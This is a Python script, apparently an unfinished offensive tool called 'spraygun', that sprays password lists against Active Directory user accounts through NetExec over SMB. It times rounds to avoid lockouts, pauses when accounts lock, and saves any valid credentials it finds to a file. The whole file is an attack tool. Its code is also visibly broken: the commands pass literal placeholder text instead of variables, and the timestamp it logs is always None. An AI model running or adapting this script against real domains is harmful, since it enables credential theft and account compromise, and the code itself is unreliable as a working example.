#!/usr/bin/env python

'''
TO DO

90 - Need to add a new line after countdown so it's not smooshed

120 - need to take two passwords from in use, spray, move both passwords into used, queue up two more passwords... repeat until done
-- probs load original password file to memory list, then take two at a time from list to spray.
-- I want to have it make another password list, then remove lines as it uses them incase it needs to be canceled, there's a save file to continue with

157 - verify locked out 
140 - parse only user/password
'''

import logging
import os
import sys
import argparse
import datetime
import time
import subprocess

##################################################################################################################
# Show how to use
##################################################################################################################
parser = argparse.ArgumentParser(
        add_help = True,
    	prog='spraygun.py',
    	formatter_class=argparse.RawTextHelpFormatter,
        description='Spraygun Help for noobs')

parser.add_argument('-dc-ip', help='Domain Controller IP address', action='store')
parser.add_argument('-d', help='Domain -- NetExec finds this automatically --', action='store')
parser.add_argument('-u', help='Users file (one user per line)', action='store')
parser.add_argument('-p', help='Password file (one password per line)', action='store')
parser.add_argument('-r', help='Number of passwords to spray per round', action='store')
parser.add_argument('-t', help='Time in minutes to sleep between spray rounds', type=int, action='store')

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)

# making 'args' available to parse inputs
args = parser.parse_args()

# making files
os.system('touch creds.txt')
os.system('touch used-passwords.txt')
os.system('touch tmp-creds.txt')
os.system('touch sprays.log')
os.system('touch passwords-in-use.txt')

	

# not sure how to use the below opens to get the password file out
#opening source files
with open(args.p, 'r') as pwds:
	#printing for testing purposes
    print(pwds.read())
with open(args.u, 'r') as users:
    #printing for testing purposes
	print(users.read())


with open(args.p, "r") as pwds:
	data = pwds.read()
with open("passwords-in-use.txt", "w") as pwdsinuse:
	pwdsinuse.write(data)

# getting line count for while loop to iterate through entire file

with open(args.p, 'r') as pwds:
	count = len(pwds.readlines())
	
# this needs to be updated because this file won't change lines

tmpcreds = open("tmp-creds.txt", "w")
write_to_creds = open("creds.txt", "a")
now = datetime.datetime.now()
logtime = print(now.strftime("%Y-%m-%d %H:%M:%S"))
spraylog = open("sprays.log", "a")



#countdown timer to show mins:secs until next spray
def countdown_timer():

    # Convert input time to seconds
    countdown_duration_seconds = args.t * 60

    # Calculate end time
    current_time = datetime.datetime.now()
    end_time = current_time + datetime.timedelta(seconds=countdown_duration_seconds)

    while end_time > current_time:
        # Calculate remaining time
        difference = end_time - current_time
        remaining_minutes = int(difference.total_seconds() // 60)
        remaining_seconds = int(difference.total_seconds() % 60)

        # Display remaining time
        remaining_time = f"{remaining_minutes}:{remaining_seconds:02d}"
        print(f"\rTime until next spray: {remaining_time}", end="")
        #doesn't new line so just get smooshed with next action

        # Introduce a 1-second delay
        time.sleep(1)

        # Update current time
        current_time = datetime.datetime.now()
    	

#added to continue or quit based on finding locked out accounts
def get_user_choice():
    while True:
        user_choice = input("Press 'c' to continue, or 'q' to quit").lower()
        if user_choice in ("c", "q"):
            return user_choice
        else:
            print("Press 'c' to continue, or 'q' to quit")

##################################################################################################################
# START SPRAY LOOP
##################################################################################################################
# meat and potatos 
# pulls all passwords into "passwords-in-use.txt" in order to edit file and keep original
# take top two (or provided) lines from file and sprays with netexec
# puts used password into "used-passwords.txt"
# sleeps

while count > 0:
    with open("passwords-in-use.txt", "r") as inuse:
    	first_two_lines = [line.strip() for line in inuse.readlines()[:2]]
    

    for line in first_two_lines:
        #spraylog.write(logtime)
        spraylog.write(f"{logtime} - {line}\n") 
        #print(logtime)
        # need to fix below
        print(f"{logtime} - {line}") # returning None - password ??
        print("Starting spray with : ", line)
        os.system('nxc smb args.dc-ip -u args.u -p {line} --continue-on-success --log sprays.log') # need a way to give line to os.system
        os.system('echo {line} >> used-passwords.txt') # this needs subprocess 
        # need to fix below
        spraylog.write(str(logtime)) # putting None password into log??
        
        



# prints found creds based on [+] from netexec
# prints creds and puts into file "creds.txt"        
    with open("sprays.log", "r") as creds:
        for line in creds.readlines():
            if '[+]' in line:
                print("=======================")
                print("CREDENTIALS FOUND: ")
                print("=======================")
                print("")
                print(line)
                tmpcreds.write(line)
                tmpcreds.close()
                write_to_creds.write(logtime)
                write_to_creds.write(line)
                write_to_creds.close()
                os.system("sort -u tmp-creds.txt > creds.txt")
                print("creds added to creds.txt")
                # need to clean this output to user : password only
    
    with open("sprays.log", "r") as lockout:
        for line in lockout.readlines():
            if "LOCKED_OUT" in line:
            # need to verify this is the locked out from nxc
                print("=======================")
                print("ACCOUNTS LOCKED OUT: ")
                print("=======================")
                print("")
                print(line)
                user_choice = get_user_choice()
                if user_choice == "c":
                    continue
                else:
                    break
                
    
    countdown_timer()
    #print("Time of last spray : ")
    #print("Time until next spray : ")

                
